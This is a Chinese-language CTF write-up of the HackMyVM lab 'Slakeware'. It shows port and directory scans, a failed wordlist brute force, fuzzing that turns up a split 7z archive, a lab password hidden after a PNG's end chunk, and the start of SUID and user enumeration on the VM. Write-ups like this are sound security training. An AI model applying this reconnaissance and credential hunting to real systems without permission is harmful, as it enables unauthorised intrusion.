---
title: Slakeware
author: hgbe02
date: 2024-04-26
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Slakeware.html"
---

# slakeware

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256370.png" alt="image-20240425160707699" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256372.png" alt="image-20240425161648293" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ rustscan -a 192.168.0.147 -- -A                       
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.147:1
Open 192.168.0.147:2
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 04:17 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:17
Completed NSE at 04:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:17
Completed NSE at 04:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:17
Completed NSE at 04:17, 0.00s elapsed
Initiating Ping Scan at 04:17
Scanning 192.168.0.147 [2 ports]
Completed Ping Scan at 04:17, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:17
Completed Parallel DNS resolution of 1 host. at 04:17, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:17
Scanning slackware (192.168.0.147) [2 ports]
Discovered open port 1/tcp on 192.168.0.147
Discovered open port 2/tcp on 192.168.0.147
Completed Connect Scan at 04:17, 0.00s elapsed (2 total ports)
Initiating Service scan at 04:17
Scanning 2 services on slackware (192.168.0.147)
Completed Service scan at 04:17, 11.08s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.0.147.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:17
Completed NSE at 04:17, 0.47s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:17
Completed NSE at 04:17, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:17
Completed NSE at 04:17, 0.00s elapsed
Nmap scan report for slackware (192.168.0.147)
Host is up, received conn-refused (0.0014s latency).
Scanned at 2024-04-25 04:17:00 EDT for 12s

PORT  STATE SERVICE REASON  VERSION
1/tcp open  ssh     syn-ack OpenSSH 9.3 (protocol 2.0)
| ssh-hostkey: 
|   256 e2:66:60:79:bc:d1:33:2e:c1:25:fa:99:e5:89:1e:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJcZY4GWIximmdPsABxAYaWgO1m0N7pVq2ce7e5tg7ll2XkNtrin7qN520RUcubKdKhR7uVcZS/FsAg9ChHCgLE=
|   256 98:59:c3:a8:2b:89:56:77:eb:72:4a:05:90:21:cb:40 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB3Vv5eWXgC7mWGGeXdd+jVBETQZmJs5JsPH/51Tnxgh
2/tcp open  http    syn-ack Apache httpd 2.4.58 ((Unix))
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.58 (Unix)
|_http-title: Tribute to Slackware

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:17
Completed NSE at 04:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:17
Completed NSE at 04:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:17
Completed NSE at 04:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.39 seconds
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ gobuster dir -u http://192.168.0.147:2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.147:2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,bak,jpg,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 7511]
/.html                (Status: 403) [Size: 199]
/background.jpg       (Status: 200) [Size: 13798]
/robots.txt           (Status: 200) [Size: 21]
/.html                (Status: 403) [Size: 199]
/getslack             (Status: 301) [Size: 240] [--> http://192.168.0.147:2/getslack/]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ sudo dirsearch -u http://192.168.0.147:2/ -e* -i 200,300-399 2>/dev/null        

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz | HTTP method: GET | Threads: 25 | Wordlist size: 14594

Output File: /home/kali/temp/slakeware/reports/http_192.168.0.147_2/__24-04-25_04-23-30.txt

Target: http://192.168.0.147:2/

[04:23:30] Starting: 
[04:23:44] 200 -    1KB - /cgi-bin/test-cgi
[04:23:44] 200 -  820B  - /cgi-bin/printenv
[04:24:00] 200 -   21B  - /robots.txt

Task Completed
```

### 漏洞扫描

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ nikto -h http://192.168.0.147:2
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.0.147
+ Target Hostname:    192.168.0.147
+ Target Port:        2
+ Start Time:         2024-04-25 04:18:40 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Unix)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ 8101 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2024-04-25 04:18:56 (GMT-4) (16 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256373.png" alt="image-20240425161919370" style="zoom:50%;" />

到处点点，找到了：

```apl
https://www.slackware.com/infra/keys/GPG-KEY
```

```bash
security@slackware.com public key

pub   1024D/40102233 2003-02-26 [expires: 2038-01-19]
uid                  Slackware Linux Project <security@slackware.com>
sub   1024g/4E523569 2003-02-26 [expires: 2038-01-19]

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.4.12 (GNU/Linux)

mQGiBD5dIFQRBADB31WinbXdaGk/8RNkpnZclu1w3Xmd5ItACDLB2FhOhArw35EA
MOYzxI0gRtDNWN4pn9n74q4HbFzyRWElThWRtBTYLEpImzrk7HYVCjMxjw5A0fTr
88aiHOth5aS0vPAoq+3TYn6JDSipf2bR03G2JVwgj3Iu066pX4naivNm8wCgldHG
F3y9vT3UPYh3QFgEUlCalt0D/3n6NopRYy0hMN6BPu+NarXwv6NQ9g0GV5FNjEEr
igkrD/htqCyWAUl8zyCKKUFZZx4UGBRZ5guCdNzwgYH3yn3aVMhJYQ6tcSlLsj3f
JIz4LAZ3+rI77rbn7gHHdp7CSAuV+QHv3aNanUD/KGz5SPSvF4w+5qRM4PfPNT1h
LMV8BACzxiyX7vzeE4ZxNYvcuCtv0mvEHl9yD66NFA35RvXaO0QiRVYeoUa5JOQZ
gwq+fIB0zgsEYDhXFkC1hM/QL4NccMRk8C09nFn4eiz4dAEnwKt4rLCJKhkLl1DW
TSoXHe/dOXaLnFyLzB1J8hEYmUvw3SwPt//wMqDiVBLeZfFcdLQwU2xhY2t3YXJl
IExpbnV4IFByb2plY3QgPHNlY3VyaXR5QHNsYWNrd2FyZS5jb20+iF8EExECAB8E
CwcDAgMVAgMDFgIBAh4BAheABQJQPlypBQlBo7MrAAoJEGpEY8BAECIzjOwAn3vp
tb6K1v2wLI9eVlnCdx4m1btpAJ9sFt4KwJrEdiO5wFC4xe9G4eZl4rkBDQQ+XSBV
EAQA3VYlpPyRKdOKoM6t1SwNG0YgVFSvxy/eiratBf7misDBsJeH86Pf8H9OfVHO
cqscLiC+iqvDgqeTUX9vASjlnvcoS/3H5TDPlxiifIDggqd2euNtJ8+lyXRBV6yP
sBIA6zki9cR4zphe48hKpSsDfj7uL5sfyc2UmKKboSu3x7cAAwUD/1jmoLQs9bIt
bTosoy+5+Uzrl0ShRlv+iZV8RPzAMFuRJNxUJkUmmThowtXRaPKFI9AVd+pP44aA
J+zxCPtS2isiW20AxubJoBPpXcVatJWi4sG+TM5Z5VRoLg7tIDNVWsyHGXPAhIG2
Y8Z1kyWwb4P8A/W2b1ZCqS7Fx4yEhTikiEwEGBECAAwFAlA+XL8FCUGjs2IACgkQ
akRjwEAQIjMsbQCgk59KFTbTlZfJ6FoZjjEmK3/xGR4AniYT+EdSdvEyRtZYkqWz
p1ayvO1b
=tibb
-----END PGP PUBLIC KEY BLOCK-----
```

但是没啥想法。

### 尝试企图爆破

文字好多，先`cewl`一个字典：

```bash
cewl http://192.168.0.147:2/ --with-numbers -d 3 -m 6 -w pass.txt
```

后台丢着爆破，发现爆破不了。

将粗的进行收集，尝试爆破：

```apl
1993
Patrick Volkerding
Slackware 15
Slackware15
LILO
ELILO
ifconfig
System V
ReiserFS
eth0
enp0s25f0u1c2i2
slakeware15
```

也寄。

### 敏感目录

```apl
http://192.168.0.147:2/robots.txt
```

```bash
User-agent: *
#7z.001
```

```apl
http://192.168.0.147:2/cgi-bin/printenv
```

```bash
#

# To permit this cgi, replace # on the first line above with the
# appropriate #!/path/to/perl shebang, and on Unix / Linux also
# set this script executable with chmod 755.
#
# ***** !!! WARNING !!! *****
# This script echoes the server environment variables and therefore
# leaks information - so NEVER use it in a live server environment!
# It is provided only for testing purpose.
# Also note that it is subject to cross site scripting attacks on
# MS IE and any other browser which fails to honor RFC2616. 

##
##  printenv -- demo CGI program which just prints its environment
##
use strict;
use warnings;

print "Content-type: text/plain; charset=iso-8859-1\n\n";
foreach my $var (sort(keys(%ENV))) {
    my $val = $ENV{$var};
    $val =~ s|\n|\\n|g;
    $val =~ s|"|\\"|g;
    print "${var}=\"${val}\"\n";
}

```

```apl
http://192.168.0.147:2/cgi-bin/test-cgi
```

```bash
#

# To permit this cgi, replace # on the first line above with the
# appropriate #!/path/to/sh shebang, and set this script executable
# with chmod 755.
#
# ***** !!! WARNING !!! *****
# This script echoes the server environment variables and therefore
# leaks information - so NEVER use it in a live server environment!
# It is provided only for testing purpose.
# Also note that it is subject to cross site scripting attacks on
# MS IE and any other browser which fails to honor RFC2616. 

# disable filename globbing
set -f

echo "Content-type: text/plain; charset=iso-8859-1"
echo

echo CGI/1.0 test script report:
echo

echo argc is $#. argv is "$*".
echo

echo SERVER_SOFTWARE = $SERVER_SOFTWARE
echo SERVER_NAME = $SERVER_NAME
echo GATEWAY_INTERFACE = $GATEWAY_INTERFACE
echo SERVER_PROTOCOL = $SERVER_PROTOCOL
echo SERVER_PORT = $SERVER_PORT
echo REQUEST_METHOD = $REQUEST_METHOD
echo HTTP_ACCEPT = "$HTTP_ACCEPT"
echo PATH_INFO = "$PATH_INFO"
echo PATH_TRANSLATED = "$PATH_TRANSLATED"
echo SCRIPT_NAME = "$SCRIPT_NAME"
echo QUERY_STRING = "$QUERY_STRING"
echo REMOTE_HOST = $REMOTE_HOST
echo REMOTE_ADDR = $REMOTE_ADDR
echo REMOTE_USER = $REMOTE_USER
echo AUTH_TYPE = $AUTH_TYPE
echo CONTENT_TYPE = $CONTENT_TYPE
echo CONTENT_LENGTH = $CONTENT_LENGTH
```

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ exiftool background.jpg 
ExifTool Version Number         : 12.76
File Name                       : background.jpg
Directory                       : .
File Size                       : 14 kB
File Modification Date/Time     : 2000:11:10 00:43:33-05:00
File Access Date/Time           : 2024:04:25 05:04:56-04:00
File Inode Change Date/Time     : 2024:04:25 05:04:56-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 362
Image Height                    : 242
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 362x242
Megapixels                      : 0.088

┌──(kali💀kali)-[~/temp/slakeware]
└─$ stegseek -wl /usr/share/wordlists/rockyou.txt background.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.54% (132.8 MB)           
[!] error: Could not find a valid passphrase.
```

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ curl http://192.168.0.147:2/getslack                                                                                
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://192.168.0.147:2/getslack/">here</a>.</p>
</body></html>

┌──(kali💀kali)-[~/temp/slakeware]
└─$ curl http://192.168.0.147:2/getslack/
search here
```

### FUZZ

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ gobuster dir -u http://192.168.0.147:2/getslack/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.147:2/getslack/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php,zip,bak,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 199]
/index.html           (Status: 200) [Size: 12]
/.html                (Status: 403) [Size: 199]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

尝试FUZZ一下`7z.001`，实际上是群里师傅先发现的！！！！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256374.png" alt="image-20240425171527882" style="zoom:50%;" />

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://192.168.0.147:2/getslack/FUZZ.7z.001 --hw 23 --sc 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.0.147:2/getslack/FUZZ.7z.001
Total requests: 38267

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                
=====================================================================

000001220:   200        80 L     794 W      19474 Ch    "twitter"                                                                              

Total time: 31.73400
Processed Requests: 38267
Filtered Requests: 38266
Requests/sec.: 1205.867
```

这就叫面向结果的编程！

下载一下：

```bash
for i in $(seq 1 20); do wget http://192.168.0.147:2/getslack/twitter.7z.00$i; done
for i in $(seq 1 20); do wget http://192.168.0.147:2/getslack/twitter.7z.0$i; done
┌──(kali💀kali)-[~/temp/slakeware]
└─$ ls -la                                                                             
total 300
drwxr-xr-x  3 kali kali  4096 Apr 25 05:28 .
drwxr-xr-x 69 kali kali  4096 Apr 25 04:16 ..
-rw-r--r--  1 kali kali 13798 Nov 10  2000 background.jpg
-rw-r--r--  1 kali kali  1497 Apr 25 04:22 pass.txt
drwxr-xr-x  3 root root  4096 Apr 25 04:23 reports
-rw-r--r--  1 kali kali   114 Apr 25 04:44 temp.txt
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.001
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.002
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.003
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.004
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.005
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.006
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.007
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.008
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.009
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.010
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.011
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.012
-rw-r--r--  1 kali kali 20480 Mar 10 17:02 twitter.7z.013
-rw-r--r--  1 kali kali  1860 Mar 10 17:02 twitter.7z.014
```

### 提取文件

解压缩一下：

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ 7z x twitter.7z.001                  

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:2 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 20480 bytes (20 KiB)

Extracting archive: twitter.7z.001
--         
Path = twitter.7z.001
Type = Split
Physical Size = 20480
Volumes = 14
Total Physical Size = 268100
----
Path = twitter.7z
Size = 268100
--
Path = twitter.7z
Type = 7z
Physical Size = 268100
Headers Size = 130
Method = LZMA2:384k
Solid = -
Blocks = 1

Everything is Ok

Size:       267951
Compressed: 268100
```

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ exiftool twitter.png                 
ExifTool Version Number         : 12.76
File Name                       : twitter.png
Directory                       : .
File Size                       : 268 kB
File Modification Date/Time     : 2024:03:10 16:42:47-04:00
File Access Date/Time           : 2024:04:25 05:31:09-04:00
File Inode Change Date/Time     : 2024:04:25 05:31:09-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 400
Image Height                    : 400
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Profile Name                    : icc
Profile CMM Type                : Little CMS
Profile Version                 : 4.4.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2022:12:19 06:28:40
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : GIMP built-in sRGB
Profile Copyright               : Public Domain
Media White Point               : 0.9642 1 0.82491
Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168
Red Matrix Column               : 0.43604 0.22249 0.01392
Blue Matrix Column              : 0.14305 0.06061 0.71393
Green Matrix Column             : 0.38512 0.7169 0.09706
Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33002
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.15001 0.06
Device Mfg Desc                 : GIMP
Device Model Desc               : sRGB
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 400x400
Megapixels                      : 0.160
```

看看啥情况：

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ tail twitter.png
trYth1sPasS1993
```

看一下照片：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256375.png" alt="image-20240425174205430" style="zoom:50%;" />

刚爆破到一半，`umz`师傅传来了喜讯：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256376.png" alt="image-20240425174003292" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256377.png" alt="image-20240425174257587" style="zoom:50%;" />

师傅牛批！！！

## 提权

### 信息搜集

```bash
(remote) patrick@slackware.slackware.local:/home/patrick$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/ping
/bin/mount
/bin/umount
/bin/ntfs-3g
/bin/fusermount
/usr/bin/at
/usr/bin/cu
/usr/bin/ksu
/usr/bin/rcp
/usr/bin/rsh
/usr/bin/uux
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/uucp
/usr/bin/crontab
/usr/bin/chage
/usr/bin/afppasswd
/usr/bin/fusermount3
/usr/bin/fdmount
/usr/bin/expiry
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/rlogin
/usr/bin/uuname
/usr/bin/uustat
/usr/bin/procmail
/usr/bin/newgidmap
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/sbin/uuxqt
/usr/sbin/uucico
/usr/libexec/lxc/lxc-user-nic
/usr/libexec/dbus-daemon-launch-helper
/usr/libexec/ssh-keysign
/sbin/unix_chkpwd
/sbin/mount.nfs
(remote) patrick@slackware.slackware.local:/home/patrick$ /usr/sbin/getcap -r / 2>/dev/null
(remote) patrick@slackware.slackware.local:/home/patrick$ cd ..
(remote) patrick@slackware.slackware.local:/home$ ls -la
total 2
drwxr-xr-x 54 root       root       1400 Mar 10 22:16 ./
drwxr-xr-x 23 root       root        536 Mar 10 16:29 ../
drwxr-x---  2 0xeex75    0xeex75      80 Mar 10 22:15 0xeex75/
drwxr-x---  2 0xh3rshel  0xh3rshel    80 Mar 11 12:41 0xh3rshel/
drwxr-x---  2 0xjin      0xjin        80 Mar 10 22:16 0xjin/
drwxr-x---  2 aceomn     ch4rm       112 Mar 10 22:15 aceomn/
drwxr-x---  2 alienum    claor       112 Mar 10 22:15 alienum/
drwxr-x---  2 annlynn    mrmidnight  112 Mar 10 22:15 annlynn/
drwxr-x---  2 avijneyam  d3b0o       112 Mar 10 22:15 avijneyam/
drwxr-x---  2 b4el7d     ziyos       112 Mar 10 22:15 b4el7d/
drwxr-x---  2 bit        whitecr0wz  112 Mar 10 22:15 bit/
drwxr-x---  2 boyras200  c4rta       112 Mar 10 22:15 boyras200/
drwxr-x---  2 c4rta      kaian       112 Mar 10 22:15 c4rta/
drwxr-x---  2 catch_me75 h1dr0       112 Mar 10 22:15 catch_me75/
drwxr-x---  2 ch4rm      gatogamer   112 Mar 10 22:15 ch4rm/
drwxr-x---  2 claor      kretinga    112 Mar 10 22:15 claor/
drwxr-x---  2 cromiphi   rijaba1     112 Mar 10 22:15 cromiphi/
drwxr-x---  2 d3b0o      kerszi      112 Mar 10 22:15 d3b0o/
drwxr-x---  2 emvee      sml         144 Mar 11 11:39 emvee/
drwxr-x---  2 root       root         48 Dec 20 21:35 ftp/
drwxr-x---  2 gatogamer  cromiphi    112 Mar 10 22:15 gatogamer/
drwxr-x---  2 h1dr0      rpj7        112 Mar 10 22:15 h1dr0/
drwxr-x---  2 icex64     x4v1l0k     112 Mar 10 22:15 icex64/
drwxr-x---  2 infayerts  bit         112 Mar 10 22:15 infayerts/
drwxr-x---  2 josemlwdf  catch_me75  112 Mar 10 22:15 josemlwdf/
drwxr-x---  2 kaian      zayotic     112 Mar 10 22:15 kaian/
drwxr-x---  2 kerszi     aceomn      112 Mar 10 22:15 kerszi/
drwxr-x---  2 kretinga   patrick     112 Mar 10 22:15 kretinga/
drwxr-x---  2 lanz       tasiyanci   112 Mar 10 22:15 lanz/
drwxr-x---  2 mindsflee  icex64      112 Mar 10 22:15 mindsflee/
drwxr-x---  2 mrmidnight alienum     112 Mar 10 22:15 mrmidnight/
drwxr-x---  2 nls        emvee       112 Mar 10 22:15 nls/
drwxr-x---  2 nolose     noname      112 Mar 10 22:15 nolose/
drwxr-x---  2 noname     nls         112 Mar 10 22:15 noname/
drwx--x--x  3 patrick    users       136 Apr 25 09:43 patrick/
drwxr-x---  2 powerful   annlynn     112 Mar 10 22:15 powerful/
drwxr-x---  2 proxy      powerful    112 Mar 10 22:15 proxy/
drwxr-x---  2 pylon      lanz        112 Mar 10 22:15 pylon/
drwxr-x---  2 rijaba1    infayerts   112 Mar 10 22:15 rijaba1/
drwxr-x---  2 rpj7       b4el7d      136 Mar 11 12:47 rpj7/
drwxr-x---  2 ruycr4ft   sancelisso  112 Mar 10 22:15 ruycr4ft/
drwxr-x---  2 sancelisso nolose      112 Mar 10 22:15 sancelisso/
drwxr-x---  2 skinny     josemlwdf   112 Mar 10 22:15 skinny/
drwxr-x---  2 sml        zenmpi      112 Mar 10 22:15 sml/
drwxr-x---  2 tasiyanci  ruycr4ft    112 Mar 10 22:15 tasiyanci/
drwxr-x---  2 terminal   zacarx007   112 Mar 10 22:15 terminal/
drwxr-x---  2 waidroc    boyras200   112 Mar 10 22:15 waidroc/
drwxr-x---  2 whitecr0wz wwfymn      112 Mar 10 22:15 whitecr0wz/
drwxr-x---  2 wwfymn     pylon       112 Mar 10 22:15 wwfymn/
drwxr-x---  2 x4v1l0k    proxy       112 Mar 10 22:15 x4v1l0k/
drwxr-x---  2 zacarx007  mindsflee   112 Mar 10 22:15 zacarx007/
drwxr-x---  2 zayotic    avijneyam   112 Mar 10 22:15 zayotic/
drwxr-x---  2 zenmpi     terminal    112 Mar 10 22:15 zenmpi/
drwxr-x---  2 ziyos      waidroc     112 Mar 10 22:15 ziyos/
(remote) patrick@slackware.slackware.local:/home$ cat /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1:bin:/bin:/bin/false
daemon:x:2:2:daemon:/sbin:/bin/false
adm:x:3:4:adm:/var/log:/bin/false
lp:x:4:7:lp:/var/spool/lpd:/bin/false
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/:/bin/false
news:x:9:13:news:/usr/lib/news:/bin/false
uucp:x:10:14:uucp:/var/spool/uucppublic:/bin/false
operator:x:11:0:operator:/root:/bin/bash
games:x:12:100:games:/usr/games:/bin/false
ftp:x:14:50::/home/ftp:/bin/false
smmsp:x:25:25:smmsp:/var/spool/clientmqueue:/bin/false
mysql:x:27:27:MySQL:/var/lib/mysql:/bin/false
rpc:x:32:32:RPC portmap user:/:/bin/false
sshd:x:33:33:sshd:/:/bin/false
gdm:x:42:42:GDM:/var/lib/gdm:/sbin/nologin
ntp:x:44:44:User for NTP:/:/bin/false
icecc:x:49:49:User for Icecream distributed compiler:/var/cache/icecream:/bin/false
oprofile:x:51:51:oprofile:/:/bin/false
usbmux:x:52:83:User for usbmux daemon:/var/empty:/bin/false
named:x:53:53:User for BIND:/var/named:/bin/false
sddm:x:64:64:User for SDDM:/var/lib/sddm:/bin/false
pulse:x:65:65:User for PulseAudio:/var/run/pulse:/bin/false
dhcpcd:x:68:68:User for dhcpcd:/var/lib/dhcpcd:/bin/false
apache:x:80:80:User for Apache:/srv/httpd:/bin/false
messagebus:x:81:81:User for D-BUS:/var/run/dbus:/bin/false
haldaemon:x:82:82:User for HAL:/var/run/hald:/bin/false
polkitd:x:87:87:PolicyKit daemon owner:/var/lib/polkit:/bin/false
pop:x:90:90:POP:/:/bin/false
postfix:x:91:91:User for Postfix MTA:/dev/null:/bin/false
dovecot:x:94:94:User for Dovecot processes:/dev/null:/bin/false
dovenull:x:95:95:User for Dovecot login processing:/dev/null:/bin/false
nobody:x:99:99:nobody:/:/bin/false
ldap:x:330:330:OpenLDAP server:/var/lib/openldap:/bin/false
